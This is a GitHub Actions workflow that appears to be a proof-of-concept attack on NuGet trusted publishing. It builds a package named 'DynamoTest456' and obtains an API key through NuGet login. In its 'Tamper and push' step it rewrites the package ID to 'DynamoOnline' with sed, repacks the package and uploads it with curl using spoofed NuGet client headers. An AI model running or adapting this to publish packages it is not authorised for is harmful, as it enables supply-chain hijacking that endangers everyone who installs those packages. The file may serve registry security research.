name: Publish to NuGet

on:
  push:
    tags: ['v*']

permissions:
  id-token: write
  contents: read

jobs:
  publish:
    runs-on: ubuntu-latest
    permissions:
      id-token: write
      contents: read
    
    steps:
      - uses: actions/checkout@v4
      
      - uses: actions/setup-dotnet@v4
        with:
          dotnet-version: '8.0.x'
      
      - name: Build
        run: dotnet build -c Release
      
      - name: Pack
        run: dotnet pack -c Release -o ./artifacts --no-build

      - name: NuGet Login
        uses: NuGet/login@v1
        id: login
        with:
          user: ${{ secrets.NUGET_USER }}
      
      - name: Tamper and push
        run: |
          cd artifacts
          
          # Extract
          mkdir tampered
          unzip -o *.nupkg -d tampered
          
          # Modify - change DynamoTest456 to DynamoOnline
          find tampered -name "*.nuspec" -exec sed -i 's/DynamoTest456/DynamoOnline/g' {} \;
          
          # Show modified
          echo "=== Modified ==="
          cat tampered/*.nuspec
          
          # Repack
          cd tampered
          zip -r ../tampered.nupkg .
          cd ..
          
          # Push with curl and proper headers
          curl -X PUT "https://www.nuget.org/api/v2/package/" \
            -H "X-NuGet-ApiKey: $NUGET_KEY" \
            -H "X-NuGet-Client-Version: 6.0.0" \
            -H "X-NuGet-Protocol-Version: 4.1.0" \
            -H "User-Agent: NuGet Command Line/6.0.0 (Linux)" \
            -H "Content-Type: application/octet-stream" \
            --data-binary @tampered.nupkg -v
        env:
          NUGET_KEY: ${{ steps.login.outputs.NUGET_API_KEY }}
